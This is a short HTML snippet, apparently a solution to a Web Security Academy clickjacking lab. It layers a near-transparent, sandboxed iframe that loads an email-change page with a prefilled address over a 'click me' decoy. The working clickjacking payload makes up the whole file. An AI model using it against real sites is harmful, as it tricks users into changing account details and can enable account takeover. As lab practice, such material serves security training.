#use the following HTML
<style>
        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }

        div {
            position: absolute;
            top: 380px;
            left: 60px;
            z-index: 1;
        }
    </style>

    <div>click me</div>
    <iframe src="https://acc41fbf1f31aca0801d00bf00f6007f.web-security-academy.net/email?email=teste%40teste.com" sandbox="allow-forms"></iframe>